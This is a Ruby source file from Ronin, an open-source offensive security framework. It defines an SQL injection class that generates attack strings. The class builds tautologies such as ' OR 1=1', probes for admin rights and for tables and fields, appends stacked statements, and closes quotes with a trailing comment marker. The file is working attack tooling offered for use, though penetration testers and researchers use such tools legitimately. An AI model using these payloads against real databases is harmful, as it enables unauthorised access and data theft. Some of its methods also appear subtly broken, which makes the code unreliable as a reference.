#
# Ronin - A decentralized repository for the storage and sharing of computer
# security advisories, exploits and payloads.
#
# Copyright (c) 2007 Hal Brodigan (postmodern at users.sourceforge.net)
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#

require 'code/sql/statement'

module Ronin
  module Code
    module SQL
      class Injection

	include Syntax
	include Formating

	# compiled SQL expressions
	attr_reader :expressions

	def initialize(*expr,&block)
	  @expressions = expr

	  instance_eval(&block) if block
	end

	def escape(var)
	  @escape = var
	end

	def injection(expr)
	  @injection = expr
	end

	def inject_error(garbage='1')
	  @injection = garbage
	end

	def exec_error
	  @injection = " EXEC SP_ (OR EXEC XP_)"
	end

	def all_rows(var='1')
	  var = format_data(var)

	  @injection = " OR #{var}=#{var}"
	end

	def exact_rows(var='1')
	  var = format_data(var)

	  @injection = " AND #{var}=#{var}"
	end

	def running_admin?
	  @injection = " AND USER_NAME() = 'dbo'"
	end

	def has_table?(table)
	  @injection = ' OR '+(select(table,:fields => count, :from => table)==1)
	end

	def has_field?(field)
	  @injection = ' OR '+field.not_null?
	end

	def uses_table?(table)
	  @injection = ' OR '+table.not_null?
	end

	def expression(*exprs)
	  new_exprs = exprs.flatten.map { |expr| expr.to_s }
	  @expressions+=new_exprs
	  return new_exprs
	end

	def like(field,search)
	  @expressions << field.like(search)
	  return @expressions.last
	end

	def is?(field,value)
	  @expressions << field.is?(value)
	  return @expressions.last
	end

	def sql(*commands,&block)
	  @statement = Statement.new(*commands,&block)
	  if @dialect
	    @statement.dialect(@dialect)
	  else
	    @dialect = @statement.dialect?
	  end

	  return @statement
	end

	def inject
	  if @injection
	    return escape_injection(@injection)
	  else
	    return escape_injection(inject_expression,inject_statement)
	  end
	end

	def Injection.inject(*expr,&block)
	  Injection.new(*expr,&block).inject
	end

	protected

	def escape?
	  if @escape
	    return @escape
	  elsif dialect?
	    case dialect?
	    when 'mysql', 'dbd' then
	      return "\\'"
	    end
	  else
	    return "'"
	  end
	end

	def inject_expression
	  return '' unless @expressions

	  ' OR '+inject_expr = sql_or( @expressions.map { |expr|
	    if expr.kind_of?(Expr)
	      expr.compile(@dialect,false)
	    else
	      expr.to_s
	    end
	  } ).strip
	end

	def inject_statement
	  return '' unless @statement
	  return '; '+@statement.compile.strip+';'
	end

	def escape_injection(*expr)
	  expr = expr.join

	  if ends_with_quote?(expr)
	    return escape?+expr.chop
	  else
	    return escape?+expr+' --'
	  end
	end

	def ends_with_quote?(str)
	  str[-1].chr=="'"
	end

      end
    end
  end
end
